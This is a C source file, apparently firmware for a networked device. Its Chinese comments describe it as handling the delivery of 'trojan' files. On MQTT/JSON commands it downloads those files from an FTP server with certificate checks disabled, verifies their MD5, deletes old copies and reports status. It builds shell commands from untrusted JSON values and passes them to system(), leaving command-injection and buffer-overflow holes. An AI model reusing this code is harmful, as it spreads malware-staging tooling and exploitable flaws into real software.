/*
 * mmget.c
 *
 *  Created on: 2019-12-30
 *      Author: andy
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include "pthread.h"
#include "mmget.h"
#include "../utils/common.h"
#include "status.h"
#include "DataProcess.h"
#include "script.h"
#include "cJSON.h"
typedef struct mmfileargc{
	int filecnt; //文件
	int settype;
	char rtype[128];
	int sid;
}MMFILEARGC;
typedef struct mmconfig{
	char lftphost[100];//lftp host user passwd
	char lftplpath[100];//本地存储文件路径
}MMCONFIG;

MMCONFIG g_tmmfile;

MM_FILE_DATA g_tmm_data[MAX_MM_NUM];

MMFILEARGC Mmfargc;//木马操作参数
/*****************************************************************
 * 函数描述：木马下发初始化，主要实现lftp所需参数的配置读取等初始化
 * 参数：无
 * 返回值： 无
 * ***************************************************************/
void mmget_init()
{
	memset(&g_tmmfile,0,sizeof(MMCONFIG));
	strcpy(g_tmmfile.lftplpath,UserCfgJson.localpath);
	sprintf(g_tmmfile.lftphost,"%s:%s@%s",UserCfgJson.user,UserCfgJson.password,UserCfgJson.ip);
	printf("%s\n",g_tmmfile.lftphost);
}

/*****************************************************************
 * 函数描述：创建木马下发线程
 * 参数：  cJSON* param_mm JSON 木马参数缓存指针
 * 		  int settype  设置参数
 * 		  				1  删除文件
 * 		  				2  下发文件
 * 返回值： 无
 * ***************************************************************/
void mmget_thread_start(cJSON* param_mm,int settype)
{
	int cnt=0;
	pthread_t pid1;
	cJSON* array_item=NULL,*mmobj=NULL;
	int array_size=0;
	char *p=NULL;
	char ftpfile[512];

	cJSON* mmfile = cJSON_GetObjectItem(param_mm, "paths");//获取文件路径
	if(mmfile == NULL){
		return ;
	}
	memset(g_tmm_data,0,sizeof(MM_FILE_DATA)*MAX_MM_NUM);
	array_size = cJSON_GetArraySize(mmfile);
	if(array_size > MAX_MM_NUM){
		printf("mm num too much\n");
	}
	for (cnt=0;cnt<array_size;cnt++){
		array_item = cJSON_GetArrayItem(mmfile, cnt);
		if (array_item != NULL){
			if(settype == 2){
				strcpy(g_tmm_data[cnt].md5string,strtok(array_item->valuestring,":"));
				strcpy(g_tmm_data[cnt].ftpfile,strtok(NULL,":"));
				strcpy(ftpfile,g_tmm_data[cnt].ftpfile);
				strtok(ftpfile,"/");
				while((p=strtok(NULL,"/"))!= NULL){
					strcpy(g_tmm_data[cnt].filename,p);
				}
				strcpy(ftpfile,g_tmm_data[cnt].filename);
				strtok(ftpfile,".");
				while((p=strtok(NULL,"."))!= NULL){
					strcpy(g_tmm_data[cnt].filetype,p);
				}
				printf("%s %s %s %s\n",g_tmm_data[cnt].filename,g_tmm_data[cnt].ftpfile,g_tmm_data[cnt].md5string,g_tmm_data[cnt].filetype);
			}
			else if(settype == 1){
				strcpy(g_tmm_data[cnt].filename,array_item->valuestring);
				printf("%s\n",g_tmm_data[cnt].filename);
			}
			else {
				printf("none type %d\n",settype);
				return ;
			}
		}
	}
	cJSON *type = cJSON_GetObjectItem(param_mm, "type");
	if(type == NULL){
		return;
	}
	cJSON *sid = cJSON_GetObjectItem(param_mm, "sid");
	if(sid == NULL){
		return;
	}
	//	printf("%s\n",type->valuestring);
	memset(&Mmfargc,0,sizeof(Mmfargc));
	Mmfargc.filecnt=cnt;
	Mmfargc.settype =settype;

	strcpy(Mmfargc.rtype,type->valuestring);
	Mmfargc.sid=sid->valueint;

	pthread_create(&pid1, NULL, (void *)mmget_file, (void *)&Mmfargc);
	usleep(1000);
	pthread_detach(pid1);
}
/*****************************************************************
* 函数描述： 木马文件删除，删除制定目录同一类型文件
* 参数：	   int idx 文件索引号
* 		   int settype
* 		   		1 删除指定文件
* 		   		2 下发文件删除同类型文件
* 返回值： 无
* 修改日期： modify by lpz 20201205 修改文件删除及判断功能，增加对文件类型结尾仍有其他字符的判断
* 		   modify by lpz 20210121 增加单独删除指定文件功能
****************************************************************/
void mmget_delete_file(int idx,int settype,char *ctype,int sid)
{
	char optpath[256];
	char optres[32];
	char update[128];
	memset(optpath,0,sizeof(optpath));
	memset(optres,0,sizeof(optres));
	memset(update,0,sizeof(update));
	if(settype == 2){
		sprintf(optpath,"rm -f %s/*.%s*",g_tmmfile.lftplpath,g_tmm_data[idx].filetype);
		system(optpath);//ftps 下载文件
		memset(optpath,0,sizeof(optpath));
		sprintf(optpath,"ls %s/|grep *.%s |wc -l",g_tmmfile.lftplpath,g_tmm_data[idx].filetype);
		sys_get(optpath, optres, sizeof(optres));//获取文件数目
		if(atoi(optres) != 0){
			sprintf(update,"delete-fail/detail:%s",g_tmm_data[idx].filename);
			update_status("wifiMMFiles", update, NULL);
		}
		else{
			sprintf(update,"delete-succ/detail:%s",g_tmm_data[idx].filename);
			update_status("wifiMMFiles", update, NULL);
		}
		status_report();
	}
	else if(settype ==1){
		sprintf(optpath,"rm -f %s/%s",g_tmmfile.lftplpath,g_tmm_data[idx].filename);
		system(optpath);//ftps 下载文件
		memset(optpath,0,sizeof(optpath));
		sprintf(optpath,"ls %s/|grep %s |wc -l",g_tmmfile.lftplpath,g_tmm_data[idx].filename);
		sys_get(optpath, optres, sizeof(optres));//获取文件数目
		cJSON * root = cJSON_CreateObject();

		cJSON_AddStringToObject(root,"type",ctype);
	    cJSON_AddNumberToObject(root, "sn", DeviceSN);
		cJSON_AddNumberToObject(root, "sid", sid);
	    if(atoi(optres) != 0){
			sprintf(update,"%s-delete-fail/detail:%s",ctype,g_tmm_data[idx].filename);
		}
		else{
			sprintf(update,"%s-delete-succ/detail:%s",ctype,g_tmm_data[idx].filename);
		}

	    cJSON* filearray = cJSON_CreateArray();
		cJSON_AddItemToObject(root,"status", filearray);


		cJSON* str= cJSON_CreateString((const char *)(update));
		cJSON_AddItemToArray(filearray, str);
		char *pdata= cJSON_Print(root);
		printf("%s\n",pdata);
		mqtt_publish_msg("status", (uint8_t *)pdata,strlen(pdata));
	    cJSON_Delete(root);

	}
	else{
		printf("error settype %d \n",settype);
		return ;
	}

}
/*****************************************************************
 * 函数描述：木马文件获取，用于从服务器下发木马文件
 * 参数：	   void* 缓存指针
 * 返回值： 无
 * ***************************************************************/
void *mmget_file(void* argv)
{
	char optpath[1024];
	char cmpmd5string[128];
	//char ftpfile[64];
	char update[512];
	MMFILEARGC *mmfgrgc;
	int data_size=0;
	mmfgrgc=(MMFILEARGC *)argv;
	data_size=mmfgrgc->filecnt;
	memset(optpath,0,sizeof(optpath));
	memset(cmpmd5string,0,sizeof(cmpmd5string));
	//memset(ftpfile,0,sizeof(ftpfile));
	memset(update,0,sizeof(update));
	for (int cnt=0;cnt<data_size;cnt++){
			//sprintf(optpath,"lftp -c 'lftp %s ;lcd %s ; get %s ; exit'",g_tmmfile.lftphost,g_tmmfile.lftplpath,g_tmm_data[cnt].ftpfile);
			sprintf(optpath,"lftp -c 'set ssl:verify-certificate no;set xfer:clobber on;lcd %s ;get ftp://%s:21../../..%s; exit'",g_tmmfile.lftplpath,g_tmmfile.lftphost,g_tmm_data[cnt].ftpfile);
			printf("%s\n",optpath);
			mmget_delete_file(cnt,mmfgrgc->settype,mmfgrgc->rtype,mmfgrgc->sid);
			if(mmfgrgc->settype ==2){
				sprintf(update,"status-downloading/detail:%s",g_tmm_data[cnt].filename);
				update_status("wifiMMFiles", update, NULL);
				status_report();
				printf("%s\n",optpath);
				system(optpath);//ftps 下载文件
				memset(optpath,0,sizeof(optpath));
				printf("%s\n",optpath);
				sprintf(optpath,"md5sum %s%s|awk '{print $1}'",g_tmmfile.lftplpath,g_tmm_data[cnt].filename);
				sys_get(optpath, cmpmd5string, sizeof(cmpmd5string));//获取文件MD5值
				if(strcmp(cmpmd5string,g_tmm_data[cnt].md5string) == 0){//比较MD5
					sprintf(update,"result-succ/detail:%s",g_tmm_data[cnt].filename);
					update_status("wifiMMFiles", update, NULL);
				}
				else{
					sprintf(update,"result-fail/detail:%s",g_tmm_data[cnt].filename);
					update_status("wifiMMFiles", update, NULL);
				}
				status_report();
			}
	}
	return NULL;
}
/*****************************************************************
* 函数描述：木马查询函数，用于调用木马目录文件读取和磁盘容量查询
* 参数：	  wu
* 返回值： 无
* ***************************************************************/
void mmfile_query(cJSON *rvroot)
{
	char dir_path[128];
	char tmp_disk[32];
	int diskorr=0;
	cJSON *rvobj=NULL;
	cJSON * root = cJSON_CreateObject();
	memset(dir_path,0,sizeof(dir_path));
	strcpy(dir_path,UserCfgJson.localpath);


	cJSON_AddNumberToObject(root, "sn", DeviceSN);
	 if ((rvobj = cJSON_GetObjectItem(rvroot, "sid")) != NULL)
	        cJSON_AddNumberToObject(root, "sid", rvobj->valueint);
	cJSON* filearray = cJSON_CreateArray();
	cJSON_AddItemToObject(root,"files", filearray);
	// get_system_status(root);
	readFileList(dir_path,filearray);
	diskorr=get_disk_occupy(tmp_disk);
	cJSON_AddNumberToObject(root, "space", diskorr);
	char *pdata= cJSON_Print(root);
	printf("%s\n",pdata);
	mqtt_publish_msg("status", (uint8_t *)pdata,strlen(pdata));
	//printf("%s\n",cJSON_Print(root));
	cJSON_Delete(root);
}
/*****************************************************************
* 函数描述：文件读取函数
* 参数：	   char *basePath 文件目录缓存指针
* 返回值： int
****************************************************************/
int readFileList(char *basePath,cJSON* filesarray)
{
    DIR *dir;
    struct dirent *ptr;
    char base[1000];
    char file_name[2048][100];
    static uint16_t file_count =0 ;
    cJSON* farray=NULL;
    if ((dir=opendir(basePath)) == NULL){
    	perror("Open dir error...");
        exit(1);
    }

    while ((ptr=readdir(dir)) != NULL){
    	if(strcmp(ptr->d_name,".")==0 || strcmp(ptr->d_name,"..")==0)    ///current dir OR parrent dir
    		continue;
    	else if(ptr->d_type == 8){    ///file
    		printf("d_name:%s/%s\n",basePath,ptr->d_name);
    		//cJSON_Add(root,"files", filearray);
    		sprintf(file_name[file_count],"%s",ptr->d_name);
    		farray= cJSON_CreateString((const char *)(file_name[file_count]));
			cJSON_AddItemToArray(filesarray, farray);
    		file_count++;
    	}
    	else if(ptr->d_type == 10){    ///link file
    		printf("d_name:%s/%s\n",basePath,ptr->d_name);
    		sprintf(file_name[file_count],"%s",ptr->d_name);
    		farray= cJSON_CreateString((const char *)(file_name[file_count]));
			cJSON_AddItemToArray(filesarray, farray);
    		file_count++;
    	}
    	else if(ptr->d_type == 4){ //dir
             memset(base,'\0',sizeof(base));
             strcpy(base,basePath);
             strcat(base,"/");
             strcat(base,ptr->d_name);
             readFileList(base,filesarray);
             closedir(dir);
             return 1;
         }
     }
     for(int i=0 ;i<file_count;i++){
    	 printf("%s\n",file_name[i]);
     }

     closedir(dir);
     return 1;
}
